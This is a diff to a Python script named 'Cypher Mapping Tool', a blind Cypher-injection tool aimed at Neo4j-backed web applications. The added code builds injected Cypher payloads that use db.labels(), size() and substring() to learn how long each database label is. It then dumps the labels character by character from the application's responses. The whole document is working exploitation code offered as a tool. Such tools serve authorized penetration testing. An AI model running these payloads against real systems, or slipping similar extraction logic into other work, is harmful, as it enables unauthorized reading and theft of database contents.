@@ -6,6 +6,7 @@ import requests
 import random
 import sys
 
+ascii_chars='abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'+"'"+'()*+,-./:;<=>?@[\]^`{|}~'
 
 def perform_request(target_url, post_data=False, cookies_dict={}, connection_timeout=5):
     #proxies={}
@@ -76,7 +77,7 @@ def generate_cookies_dictionary(cookie_string):
     return cookie_dict
 
 def get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    for number_of_labels in range(0,100,1): # Arbitarly set max number or labels to 100 :)
+    for number_of_labels in range(0,100,1): # arbitarily set max number or labels to 100 :)
         payload = injection_type + " and count {call db.labels() yield label return label} = " + str(number_of_labels)
         payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
         injection_result=cypher_inject(target_url, payload, post_data, cookies_dict, connection_timeout)
@@ -84,6 +85,38 @@ def get_number_of_labels(target_url, injection_type, blind_string, post_data, co
             return number_of_labels
     print("Unable to check number of labels!!!")
     sys.exit(-1)
+
+def get_size_of_label(target_url, label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
+    for size_of_label in range(0,1000,1): # arbitarily set max size of label to 1000 :)
+        payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
+        payload+=" limit 1 where size(label) = "+str(size_of_label)+" return label}"
+        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+        injection_result=cypher_inject(target_url, payload, post_data, cookies_dict, connection_timeout)
+        if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
+            return size_of_label
+    print(f"Unable to check size of label with index {label_index}!!!")
+    sys.exit(-1)
+
+def dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
+    global ascii_chars
+    for label_index in range(0,number_of_labels,1):
+        label_size=get_size_of_label(target_url,label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+        print(f"Size of label number {label_index}: {label_size}")
+        print("\r"+(80*" ")+f"\rValue of label number {label_index}: ",end='')
+        label_value=""
+        for character_number in range(0,label_size,1):
+            for current_char in ascii_chars:
+                if current_char == "'":
+                    current_char="\'"
+                payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
+                payload+=" limit 1 where substring(label," + str(character_number) + ",1) = '"+current_char+"' return label}"
+                payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+                injection_result=cypher_inject(target_url, payload, post_data, cookies_dict, connection_timeout)
+                if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
+                    label_value+=current_char
+                    print("\r"+(80*" ")+f"\rValue of label number {label_index}: {label_value}",end='')
+                    break
+        print("\n")
 
 print('\nCypher Mapping Tool by sectroyer v0.1\n')
 
@@ -122,6 +155,7 @@ try:
         print("Dumping labels....\n")
         number_of_labels = get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
         print(f"Number of labels found: {number_of_labels}\n")
+        dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
 
     print('')
 except SystemExit:
